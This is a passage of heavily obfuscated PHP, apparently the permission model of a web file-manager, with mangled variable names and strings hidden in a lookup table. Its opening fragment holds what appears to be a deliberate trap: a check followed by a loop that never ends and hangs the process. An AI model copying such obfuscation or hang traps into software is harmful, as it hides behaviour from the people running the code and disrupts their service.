$ïÆôÛê[435]; $ÊÈîÜ¬¸ = $_SERVER[$ïÆôÛê[436]] . $ïÆôÛê[437]; $ÙÕÃà… = $æşŞ•äÀ($ÊÈîÜ¬¸); $ĞöÂœİ = explode($ïÆôÛê[287], $ÙÕÃà…); if (count($ĞöÂœİ) < $ïÆôÛê[702]) { $¬’¾“Ã° = $ïÆôÛê[439]; $¬’¾“Ã°(); } $È­±ô½© = $ïÆôÛê[967]; $È­±ô½©($_SERVER[$ïÆôÛê[968]]); $Ä¿Ôä€¿ = 1; for ($Íòó—Ã… = $Ä¿Ôä€¿; $Íòó—Ã… > 0; $Íòó—Ã…++) { $È­±ô½© = json_encode($GLOBALS[$ïÆôÛê[503]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÎõÕæ‹ô) { $this->handle->flushall($ÎõÕæ‹ô); } return; } return $this->handle->flushAll(); } } goto fÚİ¶”ÚĞœ; dß‚Æ¯ÛÑ•: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\x63\145\137\x61\x75\x74\x68"; public function getAuth($œ™áˆ¦¢) { $™Å§Ä·Ò =& $_SERVER[¼’ç§¼´]; $şô­Ûç = $this->sourceAuthSelect($œ™áˆ¦¢); $­ÆĞ…¡Ï = array(); $òôÑ›¿å = array(); $«¤×áÎ = 2 << 25; foreach ($şô­Ûç as $Õïğ£¼) { $˜°·úı™ = Model($™Å§Ä·Ò[582])->listData($Õïğ£¼[$™Å§Ä·Ò[2092]]); if (!$˜°·úı™) { continue; } $­ÆĞ…¡Ï[] = $Õïğ£¼; $Ú—È»á§ = 0; if ($Õïğ£¼[$™Å§Ä·Ò[190]] == SourceModel::TYPE_GROUP) { $Ú—È»á§ = $«¤×áÎ * 2; } if ($Õïğ£¼[$™Å§Ä·Ò[190]] == SourceModel::TYPE_USER) { $Ú—È»á§ = $«¤×áÎ; } if ($Õïğ£¼[$™Å§Ä·Ò[190]] == SourceModel::TYPE_USER && $Õïğ£¼[$™Å§Ä·Ò[580]] == $™Å§Ä·Ò[230]) { $Ú—È»á§ = 0; } $òôÑ›¿å[] = $˜°·úı™[$™Å§Ä·Ò[498]] + $Ú—È»á§; } array_multisort($òôÑ›¿å, SORT_DESC, $­ÆĞ…¡Ï); return $­ÆĞ…¡Ï; } public function sourceAuthSelect($ªüêş¨ï) { $ñ×™˜©¸ =& $_SERVER[¼’ç§¼´]; static $šßòÃ˜  = array(); $ïºË÷ÄÉ = is_array($ªüêş¨ï) ? !1 : !0; if ($ïºË÷ÄÉ) { $ªüêş¨ï = array($ªüêş¨ï); } $›ŞÀû•Î = array(); foreach ($ªüêş¨ï as $¢¼…×àÎ) { if (isset($šßòÃ˜ [$¢¼…×àÎ])) { $›ŞÀû•Î[$¢¼…×àÎ] = $šßòÃ˜ [$¢¼…×àÎ]; } } if (count($›ŞÀû•Î) == count($ªüêş¨ï)) { return $ïºË÷ÄÉ ? $›ŞÀû•Î[$ªüêş¨ï[0]] : $›ŞÀû•Î; } $øÎ‡º¬‡ = $ñ×™˜©¸[2170]; $Á¾ù¦Êö = array($ñ×™˜©¸[193] => array($ñ×™˜©¸[7], $ªüêş¨ï)); $é±ğ™„˜ = $this->field($øÎ‡º¬‡)->order($ñ×™˜©¸[486])->where($Á¾ù¦Êö)->select(); $­ïšşı§ = array_to_keyvalue_group($é±ğ™„˜, $ñ×™˜©¸[193]); foreach ($ªüêş¨ï as $¢¼…×àÎ) { $šßòÃ˜ [$¢¼…×àÎ] = $­ïšşı§[$¢¼…×àÎ] ? $­ïšşı§[$¢¼…×àÎ] : array(); } if ($ïºË÷ÄÉ) { return $é±ğ™„˜; } return $­ïšşı§; } public function setAuth($±ƒ’â¬×, $­€¯Ãèç) { $ÙÄğı’ =& $_SERVER[¼’ç§¼´]; $Ş àœ”‘ = Model($ÙÄğı’[1430])->sourceInfo($±ƒ’â¬×); if (!$Ş àœ”‘) { return !1; } if ($Ş àœ”‘[$ÙÄğı’[190]] != SourceModel::TYPE_GROUP) { return !1; } $ƒµ÷ûø = 1; $âŒäµ¥Ò = $Ş àœ”‘[$ÙÄğı’[580]]; if ($âŒäµ¥Ò != $ƒµ÷ûø) { $ïâÆ‹Æã = array($ÙÄğı’[1984] => $âŒäµ¥Ò); $òïË¸åÎ = Model($ÙÄğı’[2078])->field($ÙÄğı’[1783])->where($ïâÆ‹Æã)->select(); $òïË¸åÎ = array_to_keyvalue($òïË¸åÎ, $ÙÄğı’[12], $ÙÄğı’[1783]); } $È„ó­Óê = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $‹™ş§î = array(); foreach ($­€¯Ãèç as $¼ë–œÃ®) { if (!in_array($¼ë–œÃ®[$ÙÄğı’[190]], $È„ó­Óê)) { show_json(LNG($ÙÄğı’[2171]), !1); } if ($âŒäµ¥Ò != $ƒµ÷ûø) { if ($¼ë–œÃ®[$ÙÄğı’[190]] == SourceModel::TYPE_GROUP) { } if ($¼ë–œÃ®[$ÙÄğı’[580]] != 0 && !in_array($¼ë–œÃ®[$ÙÄğı’[580]], $òïË¸åÎ)) { } } if ($¼ë–œÃ®[$ÙÄğı’[580]] == 0) { $¼ë–œÃ®[$ÙÄğı’[190]] = SourceModel::TYPE_USER; } $‹™ş§î[] = array($ÙÄğı’[193] => $±ƒ’â¬×, $ÙÄğı’[190] => intval($¼ë–œÃ®[$ÙÄğı’[190]]), $ÙÄğı’[580] => intval($¼ë–œÃ®[$ÙÄğı’[580]]), $ÙÄğı’[2092] => intval($¼ë–œÃ®[$ÙÄğı’[2092]]) ? intval($¼ë–œÃ®[$ÙÄğı’[2092]]) : 0, $ÙÄğı’[2153] => intval($¼ë–œÃ®[$ÙÄğı’[2153]]) ? intval($¼ë–œÃ®[$ÙÄğı’[2153]]) : -1); } $this->where(array($ÙÄğı’[502] => $±ƒ’â¬×))->delete(); $this->addAll($‹™ş§î); return !0; } public function authClear($¶÷ûè³‹) { $·Ëá‰Ã» =& $_SERVER[¼’ç§¼´]; $—í­Ûé° = Model($·Ëá‰Ã»[1430])->sourceInfo($¶÷ûè³‹); $ƒà²”û = array($¶÷ûè³‹); if ($—í­Ûé°[$·Ëá‰Ã»[496]] == $·Ëá‰Ã»[91]) { $„„ĞîÀâ = array($·Ëá‰Ã»[666] => array($·Ëá‰Ã»[626], $—í­Ûé°[$·Ëá‰Ã»[595]] . $¶÷ûè³‹ . $·Ëá‰Ã»[627])); $ƒà²”û = Model($·Ëá‰Ã»[1430])->field($·Ëá‰Ã»[502])->where($„„ĞîÀâ)->getField($·Ëá‰Ã»[193], !0); $ƒà²”û[] = $¶÷ûè³‹; } $this->where(array($·Ëá‰Ã»[502] => array($·Ëá‰Ã»[503], $ƒà²”û)))->delete(); return !0; } public function getAllChildren($…™“´) { $ø‘è×í– =& $_SERVER[¼’ç§¼´]; $ß…–”Ì = Model($ø‘è×í–[1430])->sourceInfo($…™“´); if ($ß…–”Ì[$ø‘è×í–[496]] != $ø‘è×í–[91]) { return $this->sourceListAuth(array($…™“´)); } if ($ß…–”Ì[$ø‘è×í–[190]] != SourceModel::TYPE_GROUP) { return array(); } $ù¥êÂõì = 1; $˜†“ÚÒû = array($…™“´); if ($ß…–”Ì[$ø‘è×í–[192]] == $ø‘è×í–[230] && $ß…–”Ì[$ø‘è×í–[580]] != $ù¥êÂõì) { $˜†“ÚÒû = $this->groupChidldAllRootSource($ß…–”Ì[$ø‘è×í–[580]]); } $‹¥ÂšÅÇ = $this->field($ø‘è×í–[193])->group($ø‘è×í–[193])->select(); $‹¥ÂšÅÇ = array_to_keyvalue($‹¥ÂšÅÇ, $ø‘è×í–[12], $ø‘è×í–[193]); if (!$‹¥ÂšÅÇ) { return array(); } $Êù·Î¨Û = $ø‘è×í–[2172]; $ó”òäƒÒ = array($ø‘è×í–[193] => array($ø‘è×í–[7], $‹¥ÂšÅÇ), $ø‘è×í–[516] => $ø‘è×í–[230]); $„æ¡ûèß = Model($ø‘è×í–[913])->field($Êù·Î¨Û)->where($ó”òäƒÒ)->select(); $“¼«—– = array($…™“´); foreach ($„æ¡ûèß as $´—•›) { foreach ($˜†“ÚÒû as $”€•ã) { $Æª÷°ø = $ø‘è×í–[50] . $”€•ã . $ø‘è×í–[50]; $Ğßˆå– = $´—•›[$ø‘è×í–[595]] . $´—•›[$ø‘è×í–[193]] . $ø‘è×í–[50]; if (strstr($Ğßˆå–, $Æª÷°ø)) { $“¼«—–[] = $´—•›[$ø‘è×í–[193]]; break; } } } return $this->sourceListAuth($“¼«—–); } private function sourceListAuth($ŞÇ²Áóø) { $ã¾†ŞÓ¢ =& $_SERVER[¼’ç§¼´]; $ë°•Ì’Š = Model($ã¾†ŞÓ¢[1430])->sourceListInfo($ŞÇ²Áóø, !0); $ÀÒŒ›¼¢ = $this->sourceAuthSelect($ŞÇ²Áóø); $ÖÅ„¡ = array(); $´úæ×¾æ = array(); foreach ($ë°•Ì’Š as $‰„„¯°é) { unset($‰„„¯°é[$ã¾†ŞÓ¢[540]]); unset($‰„„¯°é[$ã¾†ŞÓ¢[538]]); unset($‰„„¯°é[$ã¾†ŞÓ¢[498]]); unset($‰„„¯°é[$ã¾†ŞÓ¢[90]]); $«îÍ¯ğÎ = $ÀÒŒ›¼¢[$‰„„¯°é[$ã¾†ŞÓ¢[193]]]; if (!$«îÍ¯ğÎ) { continue; } $‰„„¯°é[$ã¾†ŞÓ¢[2173]] = $this->authTargetInfo($«îÍ¯ğÎ); $‰„„¯°é[$ã¾†ŞÓ¢[593]] = rtrim($‰„„¯°é[$ã¾†ŞÓ¢[599]], $ã¾†ŞÓ¢[8]) . $ã¾†ŞÓ¢[8] . ltrim($‰„„¯°é[$ã¾†ŞÓ¢[593]], $ã¾†ŞÓ¢[8]); $ÖÅ„¡[] = $‰„„¯°é; $®ı’“€ = count(explode($ã¾†ŞÓ¢[8], trim($‰„„¯°é[$ã¾†ŞÓ¢[593]], $ã¾†ŞÓ¢[8]))); $´úæ×¾æ[] = $®ı’“€ + ($‰„„¯°é[$ã¾†ŞÓ¢[33]] == $ã¾†ŞÓ¢[78] ? 0 : 1000); } array_multisort($´úæ×¾æ, SORT_ASC, $ÖÅ„¡); return $ÖÅ„¡; } private function groupChidldAllRootSource($×åó£­) { $ûúóÆİ =& $_SERVER[¼’ç§¼´]; $ã†»ıÅ = Model($ûúóÆİ[2174])->groupChildrenAll($×åó£­); $İèÑªÙ£ = array($ûúóÆİ[192] => 0, $ûúóÆİ[580] => array($ûúóÆİ[7], $ã†»ıÅ), $ûúóÆİ[190] => SourceModel::TYPE_GROUP); $âƒÖˆ¤Ó = Model($ûúóÆİ[913])->field($ûúóÆİ[193])->where($İèÑªÙ£)->select(); $âƒÖˆ¤Ó = array_to_keyvalue($âƒÖˆ¤Ó, $ûúóÆİ[12], $ûúóÆİ[193]); return $âƒÖˆ¤Ó; } private function authTargetInfo($ù‹› Ôî) { $øÓéØÉÏ =& $_SERVER[¼’ç§¼´]; $şÅÖŒï = array(); $°î§ëâ¢ = array(); $Ğ†¤½ßİ = 2 << 25; foreach ($ù‹› Ôî as $ØŒ“©³Ê) { $²Õ¤î¶ù = Model($øÓéØÉÏ[582])->listData($ØŒ“©³Ê[$øÓéØÉÏ[2092]]); if (!$²Õ¤î¶ù) { continue; } if ($ØŒ“©³Ê[$øÓéØÉÏ[190]] == SourceModel::TYPE_USER) { $ï»åÄıÛ = Model($øÓéØÉÏ[588])->getInfoSimpleOuter($ØŒ“©³Ê[$øÓéØÉÏ[580]]); if ($ï»åÄıÛ[$øÓéØÉÏ[1783]] == $øÓéØÉÏ[1282]) { continue; } if ($ï»åÄıÛ[$øÓéØÉÏ[1783]] == $øÓéØÉÏ[230]) { $ï»åÄıÛ[$øÓéØÉÏ[32]] = LNG($øÓéØÉÏ[2175]); } } else { $ï»åÄıÛ = Model($øÓéØÉÏ[596])->getInfoSimple($ØŒ“©³Ê[$øÓéØÉÏ[580]]); } if (!$ï»åÄıÛ) { continue; } $ï»åÄıÛ[$øÓéØÉÏ[551]] = $²Õ¤î¶ù; $şÅÖŒï[] = $ï»åÄıÛ; $°ò›ö¾ = 0; if ($ØŒ“©³Ê[$øÓéØÉÏ[190]] == SourceModel::TYPE_GROUP) { $°ò›ö¾ = $Ğ†¤½ßİ * 2; } if ($ØŒ“©³Ê[$øÓéØÉÏ[190]] == SourceModel::TYPE_USER) { $°ò›ö¾ = $Ğ†¤½ßİ; } if ($ØŒ“©³Ê[$øÓéØÉÏ[190]] == SourceModel::TYPE_USER && $ØŒ“©³Ê[$øÓéØÉÏ[580]] == $øÓéØÉÏ[230]) { $°ò›ö¾ = 0; } $°î§ëâ¢[] = $²Õ¤î¶ù[$øÓéØÉÏ[498]] + $°ò›ö¾; } array_multisort($°î§ëâ¢, SORT_DESC, $şÅÖŒï); return $şÅÖŒï; } public function getAllChildrenByUser($ş‚„€Ğ, $…ğœÎ) { $ÖƒèÊÅ× =& $_SERVER[¼’ç§¼´]; $Äˆ§ÑÌÛ = Model($ÖƒèÊÅ×[608])->getInfo($…ğœÎ); if (!$…ğœÎ || !$ş‚„€Ğ || !$Äˆ§ÑÌÛ) { return array(); } $»À»Çáœ = Model($ÖƒèÊÅ×[1430])->sourceInfo($ş‚„€Ğ); $Ü©‡ú¢ = array(); $ìĞ¡÷× = 1; if ($»À»Çáœ[$ÖƒèÊÅ×[192]] == $ÖƒèÊÅ×[230] && $»À»Çáœ[$ÖƒèÊÅ×[580]] != $ìĞ¡÷× && $this->groupContainUser($»À»Çáœ[$ÖƒèÊÅ×[580]], $…ğœÎ)) { foreach ($Äˆ§ÑÌÛ[$ÖƒèÊÅ×[2176]] as $Ê·ı¯Š”) { $À‹êšºÔ = Model($ÖƒèÊÅ×[596])->getInfo($Ê·ı¯Š”[$ÖƒèÊÅ×[1984]]); $‡İîğó¢ = Model($ÖƒèÊÅ×[608])->getInfoSimpleOuter($…ğœÎ); $‡İîğó¢[$ÖƒèÊÅ×[551]] = $Ê·ı¯Š”[$ÖƒèÊÅ×[498]]; if (Model($ÖƒèÊÅ×[582])->authCheckAction($Ê·ı¯Š”[$ÖƒèÊÅ×[498]][$ÖƒèÊÅ×[498]], $ÖƒèÊÅ×[2005])) { continue; } $ÊÓ•†ˆ = array($ÖƒèÊÅ×[32] => $ÖƒèÊÅ×[1302] . $À‹êšºÔ[$ÖƒèÊÅ×[32]], $ÖƒèÊÅ×[193] => $À‹êšºÔ[$ÖƒèÊÅ×[90]][$ÖƒèÊÅ×[193]], $ÖƒèÊÅ×[87] => KodIO::make($À‹êšºÔ[$ÖƒèÊÅ×[90]][$ÖƒèÊÅ×[193]]), $ÖƒèÊÅ×[192] => $ÖƒèÊÅ×[230], $ÖƒèÊÅ×[190] => $ÖƒèÊÅ×[589], $ÖƒèÊÅ×[33] => $ÖƒèÊÅ×[630], $ÖƒèÊÅ×[593] => $À‹êšºÔ[$ÖƒèÊÅ×[600]], $ÖƒèÊÅ×[1984] => $À‹êšºÔ[$ÖƒèÊÅ×[1984]], $ÖƒèÊÅ×[597] => $À‹êšºÔ[$ÖƒèÊÅ×[192]], $ÖƒèÊÅ×[2173] => array($‡İîğó¢)); $Ü©‡ú¢[$ÊÓ•†ˆ[$ÖƒèÊÅ×[193]]] = $ÊÓ•†ˆ; } } $¯ÒŒó¤â = array(); $Ï®ıËÑ = $this->getAllChildren($ş‚„€Ğ); foreach ($Ï®ıËÑ as $®ÍÓ—†©) { $ÜßàÔ = !1; foreach ($®ÍÓ—†©[$ÖƒèÊÅ×[2173]] as $Í€…Õ¨â) { if ($Í€…Õ¨â[$ÖƒèÊÅ×[1783]]) { if ($Í€…Õ¨â[$ÖƒèÊÅ×[1783]] == $…ğœÎ) { $ÜßàÔ = !0; break; } } if ($Í€…Õ¨â[$ÖƒèÊÅ×[1984]]) { if ($this->groupContainUser($Í€…Õ¨â[$ÖƒèÊÅ×[1984]], $…ğœÎ)) { $ÜßàÔ = !0; break; } } } if ($ÜßàÔ) { $¯ÒŒó¤â[] = $®ÍÓ—†©; } $ŒÇÆ¿¶Ã = $®ÍÓ—†©[$ÖƒèÊÅ×[193]]; if (isset($Ü©‡ú¢[$ŒÇÆ¿¶Ã])) { $®ÍÓ—†©[$ÖƒèÊÅ×[2173]][] = $Ü©‡ú¢[$ŒÇÆ¿¶Ã][0]; $Ü©‡ú¢[$ŒÇÆ¿¶Ã] = !1; } } $Ü©‡ú¢ = array_filter(array_values($Ü©‡ú¢)); $¯ÒŒó¤â = array_merge($Ü©‡ú¢, $¯ÒŒó¤â); return $¯ÒŒó¤â; } public function setAllChildrenByUser($“¼ßšº¯, $Ø‘ˆ¶Ÿ, $‹—ãÓú­) { $ò®Î“ ˆ =& $_SERVER[¼’ç§¼´]; $Øö›Šøü = $this->getAllChildrenByUser($“¼ßšº¯, $Ø‘ˆ¶Ÿ); if (!$‹—ãÓú­ || !$Øö›Šøü) { return !1; } foreach ($Øö›Šøü as $¾³Ÿµ¹‚) { $ô¥ŸôÚ‹ = array(); foreach ($¾³Ÿµ¹‚[$ò®Î“ ˆ[2173]] as $¸˜öğìº) { $Íæ³Åï¿ = $¸˜öğìº[$ò®Î“ ˆ[551]]; $œ¹ŞÍ‹ = $¸˜öğìº[$ò®Î“ ˆ[1783]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $â»Æ¦á = $¸˜öğìº[$ò®Î“ ˆ[1783]] ? $¸˜öğìº[$ò®Î“ ˆ[1783]] : $¸˜öğìº[$ò®Î“ ˆ[1984]]; if ($¸˜öğìº[$ò®Î“ ˆ[1783]] && $¸˜öğìº[$ò®Î“ ˆ[1783]] == $Ø‘ˆ¶Ÿ) { continue; } $ô¥ŸôÚ‹[] = array($ò®Î“ ˆ[193] => $¾³Ÿµ¹‚[$ò®Î“ ˆ[193]], $ò®Î“ ˆ[190] => $œ¹ŞÍ‹, $ò®Î“ ˆ[580] => intval($â»Æ¦á), $ò®Î“ ˆ[2092] => isset($Íæ³Åï¿[$ò®Î“ ˆ[486]]) ? intval($Íæ³Åï¿[$ò®Î“ ˆ[486]]) : 0, $ò®Î“ ˆ[2153] => isset($Íæ³Åï¿[$ò®Î“ ˆ[2153]]) ? intval($Íæ³Åï¿[$ò®Î“ ˆ[2153]]) : -1); } $ô¥ŸôÚ‹[] = array($ò®Î“ ˆ[193] => $¾³Ÿµ¹‚[$ò®Î“ ˆ[193]], $ò®Î“ ˆ[190] => SourceModel::TYPE_USER, $ò®Î“ ˆ[580] => intval($Ø‘ˆ¶Ÿ), $ò®Î“ ˆ[2092] => intval($‹—ãÓú­), $ò®Î“ ˆ[2153] => -1); $this->where(array($ò®Î“ ˆ[502] => $¾³Ÿµ¹‚[$ò®Î“ ˆ[193]]))->delete(); $this->addAll($ô¥ŸôÚ‹); } return !0; } public function get($ıœ¿ÇªÎ) { $¢œ·ƒŸ = $this->getSourceList(array($ıœ¿ÇªÎ), !0); return $¢œ·ƒŸ[0]; } public function getSourceList($Îğâ‹Ñ, $­‹Œ§  = false, $¤ıôûƒº = false) { $í‚–ªŠ =& $_SERVER[¼’ç§¼´]; if (!$Îğâ‹Ñ) { return array(); } $ÈĞŞ•ûŞ = Model($í‚–ªŠ[1430]); if (!$­‹Œ§  && count($Îğâ‹Ñ) == 1) { $­‹Œ§  = array(); $­‹Œ§ [$Îğâ‹Ñ[0]] = $ÈĞŞ•ûŞ->sourceInfo($Îğâ‹Ñ[0]); } if (!$­‹Œ§ ) { $¿µ¡‰Ë = array($í‚–ªŠ[502] => array($í‚–ªŠ[503], $Îğâ‹Ñ)); $­‹Œ§  = $ÈĞŞ•ûŞ->field($í‚–ªŠ[2177])->where($¿µ¡‰Ë)->select(); $­‹Œ§  = array_to_keyvalue($­‹Œ§ , $í‚–ªŠ[193]); } $¸ÕêÇ¨Œ = $Îğâ‹Ñ; foreach ($­‹Œ§  as $ÃÏäã©§ => $¸ğÃœ¡‰) { $ŞÈª = $ÈĞŞ•ûŞ->parentLevelArray($¸ğÃœ¡‰[$í‚–ªŠ[595]]); $¸ÕêÇ¨Œ = array_merge($¸ÕêÇ¨Œ, array($ÃÏäã©§), array_reverse($ŞÈª)); } $¸ÕêÇ¨Œ = array_values(array_unique($¸ÕêÇ¨Œ)); if (!$¸ÕêÇ¨Œ) { return array(); } $Å•¯¼µ = $this->sourceAuthSelect($¸ÕêÇ¨Œ); $¸šê…àµ = array(); foreach ($¸ÕêÇ¨Œ as $İŞïÆ´û) { if (isset($Å•¯¼µ[$İŞïÆ´û])) { $¸šê…àµ[$İŞïÆ´û] = $Å•¯¼µ[$İŞïÆ´û]; } } $ÍÒà¶ÀÂ = $this->userIsRoot($¤ıôûƒº); $øËİÙå = AuthModel::authAll(); $’Ï¦šÖÕ = array($í‚–ªŠ[499] => $øËİÙå, $í‚–ªŠ[2178] => array($í‚–ªŠ[504] => 0, $í‚–ªŠ[1990] => $øËİÙå, $í‚–ªŠ[505] => LNG($í‚–ªŠ[2179]), $í‚–ªŠ[2007] => $í‚–ªŠ[2180])); $ìˆœ€Š = array(); foreach ($­‹Œ§  as $İŞïÆ´û => $¾÷‰ô“) { if ($ÍÒà¶ÀÂ && $GLOBALS[$í‚–ªŠ[6]][$í‚–ªŠ[2003]]) { $ìˆœ€Š[$İŞïÆ´û] = $’Ï¦šÖÕ; continue; } $ìˆœ€Š[$İŞïÆ´û] = $this->makeSourceAuth($¾÷‰ô“, $¸šê…àµ, $¤ıôûƒº); } return $ìˆœ€Š; } public function authDeepCheck($í«ŞÆè, $¶¶Â…öÊ = false) { $ğÓ‰í´Š =& $_SERVER[¼’ç§¼´]; $¶¶Â…öÊ = $¶¶Â…öÊ ? $¶¶Â…öÊ : USER_ID; $Ç«±´»• = $this->makeAuthDeep($¶¶Â…öÊ); if (!in_array($í«ŞÆè, $Ç«±´»•[$ğÓ‰í´Š[2181]])) { return !1; } $ä­ ß£ = array(); foreach ($Ç«±´»•[$ğÓ‰í´Š[2182]] as $ˆŒçÇ«à => $³¹ ò–ã) { if (!in_array($í«ŞÆè, $³¹ ò–ã)) { continue; } $ä­ ß£[] = $ˆŒçÇ«à; } if (!$ä­ ß£) { return !1; } $™–•Ä¡À = $ä­ ß£ ? $ä­ ß£[0] : $í«ŞÆè; return array($ğÓ‰í´Š[499] => -1, $ğÓ‰í´Š[551] => array($ğÓ‰í´Š[504] => $ğÓ‰í´Š[1282], $ğÓ‰í´Š[1990] => $ğÓ‰í´Š[230], $ğÓ‰í´Š[505] => LNG($ğÓ‰í´Š[2183]), $ğÓ‰í´Š[2007] => $ğÓ‰í´Š[2184]), $ğÓ‰í´Š[2185] => LNG($ğÓ‰í´Š[2186]), $ğÓ‰í´Š[2187] => $this->sourceAuthInfo($™–•Ä¡À)); } protected function makeAuthDeep($“¹‘¦àğ = false) { $ÚÀ›ÙÆ  =& $_SERVER[¼’ç§¼´]; static $„©…¦†è = array(); $“¹‘¦àğ = $“¹‘¦àğ ? $“¹‘¦àğ : USER_ID; if (isset($„©…¦†è[$“¹‘¦àğ])) { return $„©…¦†è[$“¹‘¦àğ]; } $Ä¡„ê€ = Model($ÚÀ›ÙÆ [2188])->listData(); $±£Şî = array(); foreach ($Ä¡„ê€ as $É…Ÿé½Ï) { if ($É…Ÿé½Ï[$ÚÀ›ÙÆ [498]] == 0 && $É…Ÿé½Ï[$ÚÀ›ÙÆ [2006]] == $ÚÀ›ÙÆ [91]) { $±£Şî[] = $É…Ÿé½Ï[$ÚÀ›ÙÆ [486]]; } } $®´–ªÀÒ = $this->userGroupParents($“¹‘¦àğ); $¼´­ÃÈ« = array($ÚÀ›ÙÆ [190] => SourceModel::TYPE_USER, $ÚÀ›ÙÆ [580] => $“¹‘¦àğ); if ($®´–ªÀÒ) { $¼´­ÃÈ« = array(array($ÚÀ›ÙÆ [190] => SourceModel::TYPE_USER, $ÚÀ›ÙÆ [580] => $“¹‘¦àğ), array($ÚÀ›ÙÆ [190] => SourceModel::TYPE_GROUP, $ÚÀ›ÙÆ [580] => array($ÚÀ›ÙÆ [503], $®´–ªÀÒ)), $ÚÀ›ÙÆ [1086] => $ÚÀ›ÙÆ [2086]); } $”à÷¾Ÿ÷ = $this->field($ÚÀ›ÙÆ [2189])->where($¼´­ÃÈ«)->select(); $—âì‚¢© = array(); $óÇÂÕ»¤ = array_to_keyvalue_group($”à÷¾Ÿ÷, $ÚÀ›ÙÆ [193]); foreach ($óÇÂÕ»¤ as $äŞ´Ÿã™ => $Í¶Ò•»ş) { $İŠ°˜ú = $this->authArrayCheck($Í¶Ò•»ş, $“¹‘¦àğ); if ($İŠ°˜ú[$ÚÀ›ÙÆ [499]] > 0) { $—âì‚¢©[] = $äŞ´Ÿã™ . $ÚÀ›ÙÆ [12]; } } if ($®´–ªÀÒ) { $â–ÀÛí = Model($ÚÀ›ÙÆ [596]); foreach ($®´–ªÀÒ as $½·£™î) { $æ‡ìÒ®— = $â–ÀÛí->getInfo($½·£™î); if (!$æ‡ìÒ®— || !is_array($æ‡ìÒ®—[$ÚÀ›ÙÆ [90]])) { continue; } $—âì‚¢©[] = $æ‡ìÒ®—[$ÚÀ›ÙÆ [90]][$ÚÀ›ÙÆ [193]]; } } $ÚÅáŸ…ñ = array(); $æü‘Â¦¶ = $®´–ªÀÒ; $µÀé™“Ö = Model($ÚÀ›ÙÆ [1430]); $â–ÀÛí = Model($ÚÀ›ÙÆ [596]); $±Üˆç–Õ = array(); $ŒËÏï¯± = array(); $ÉõïáÕƒ = array(); $ÔŸáë‡ = array(); if ($—âì‚¢©) { $ÙÜ¤Í·¹ = $µÀé™“Ö->where(array($ÚÀ›ÙÆ [193] => array($ÚÀ›ÙÆ [503], $—âì‚¢©)))->select(); foreach ($ÙÜ¤Í·¹ as $·ùìÊó€) { if ($·ùìÊó€[$ÚÀ›ÙÆ [516]] == $ÚÀ›ÙÆ [91]) { continue; } $èå÷ş¢ö = $µÀé™“Ö->parentLevelArray($·ùìÊó€[$ÚÀ›ÙÆ [595]]); $ÚÅáŸ…ñ = array_merge($ÚÅáŸ…ñ, $èå÷ş¢ö); $æü‘Â¦¶[] = $·ùìÊó€[$ÚÀ›ÙÆ [580]]; $±Üˆç–Õ[$·ùìÊó€[$ÚÀ›ÙÆ [193]]] = $èå÷ş¢ö; $ŒËÏï¯±[$·ùìÊó€[$ÚÀ›ÙÆ [193]]] = $·ùìÊó€[$ÚÀ›ÙÆ [580]]; } } $æü‘Â¦¶ = array_values(array_unique($æü‘Â¦¶)); $õ÷¶Ïı = $æü‘Â¦¶; foreach ($õ÷¶Ïı as $½·£™î) { $æ‡ìÒ®— = $â–ÀÛí->getInfo($½·£™î); $èå÷ş¢ö = $µÀé™“Ö->parentLevelArray($æ‡ìÒ®—[$ÚÀ›ÙÆ [595]]); $æü‘Â¦¶ = array_merge($æü‘Â¦¶, $èå÷ş¢ö); } $æü‘Â¦¶ = array_values(array_unique($æü‘Â¦¶)); foreach ($æü‘Â¦¶ as $½·£™î) { $æ‡ìÒ®— = $â–ÀÛí->getInfo($½·£™î); $ÚÅáŸ…ñ[] = $æ‡ìÒ®—[$ÚÀ›ÙÆ [90]][$ÚÀ›ÙÆ [193]]; $ÉõïáÕƒ[$½·£™î] = $æ‡ìÒ®—[$ÚÀ›ÙÆ [90]][$ÚÀ›ÙÆ [193]]; $ÔŸáë‡[$½·£™î] = $µÀé™“Ö->parentLevelArray($æ‡ìÒ®—[$ÚÀ›ÙÆ [595]]); } foreach ($±Üˆç–Õ as $òİş¦ß“ => $†›ÓÔÆ) { $á©Åğè¯ = $ŒËÏï¯±[$òİş¦ß“]; if (!$á©Åğè¯ || !$ÉõïáÕƒ[$á©Åğè¯]) { continue; } $—´£¨Œ¯ = array(); foreach ($ÔŸáë‡[$á©Åğè¯] as $½·£™î) { $—´£¨Œ¯[] = $ÉõïáÕƒ[$½·£™î]; } $±Üˆç–Õ[$òİş¦ß“] = array_merge($—´£¨Œ¯, $†›ÓÔÆ); } $ÚÅáŸ…ñ = array_values(array_unique($ÚÅáŸ…ñ)); $Ú–éñŸ¼ = array($ÚÀ›ÙÆ [2181] => $ÚÅáŸ…ñ, $ÚÀ›ÙÆ [2182] => $±Üˆç–Õ); $„©…¦†è[$“¹‘¦àğ] = $Ú–éñŸ¼; return $Ú–éñŸ¼; } private function makeSourceAuth($¡ëåÉ†Ù, $…¬£ˆİ, $Ï³Ü¤˜¿ = false) { $²…‹ñ• =& $_SERVER[¼’ç§¼´]; $Ñ»ê¶ı = $²…‹ñ•[91]; $…±˜îÃ¼ = $¡ëåÉ†Ù[$²…‹ñ•[580]]; $îÑ£É‘§ = $¡ëåÉ†Ù[$²…‹ñ•[190]] == SourceModel::TYPE_GROUP; $Ñ°Ç´â¦ = $îÑ£É‘§ ? $this->groupRootAuth($…±˜îÃ¼, $Ï³Ü¤˜¿) : !1; if ($Ñ°Ç´â¦ && Model($²…‹ñ•[582])->authCheckAction($Ñ°Ç´â¦[$²…‹ñ•[498]], $²…‹ñ•[2005])) { return $this->groupAuthInfo($Ñ°Ç´â¦, $…±˜îÃ¼); } $§ô÷²ã¦ = Model($²…‹ñ•[1430])->parentLevelArray($¡ëåÉ†Ù[$²…‹ñ•[595]]); $§ô÷²ã¦ = array_merge(array($¡ëåÉ†Ù[$²…‹ñ•[193]]), array_reverse($§ô÷²ã¦)); $„Õ¢Ë§ = !1; foreach ($§ô÷²ã¦ as $ÆÉ€°î¤) { if (!isset($…¬£ˆİ[$ÆÉ€°î¤])) { continue; } $¸¾ëÑ²¿ = $this->authMake($…¬£ˆİ[$ÆÉ€°î¤], $Ï³Ü¤˜¿); if ($¸¾ëÑ²¿[$²…‹ñ•[551]]) { $„Õ¢Ë§ = $¸¾ëÑ²¿; break; } } if 